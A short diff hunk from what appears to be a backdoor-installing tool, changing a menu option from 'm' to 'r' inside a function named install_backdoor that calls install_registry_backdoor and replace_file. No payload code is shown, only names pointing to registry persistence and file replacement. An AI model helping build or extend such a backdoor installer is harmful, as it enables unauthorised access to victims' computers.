@@ -21,7 +21,7 @@ def install_backdoor(filePath, registryPath):
             install_registry_backdoor(registryPath, fileName)
             replace_file(filePath, fileName)
             return
-        elif choice == 'm':
+        elif choice == 'r':
             return
         else:
             print("Invalid Input.")
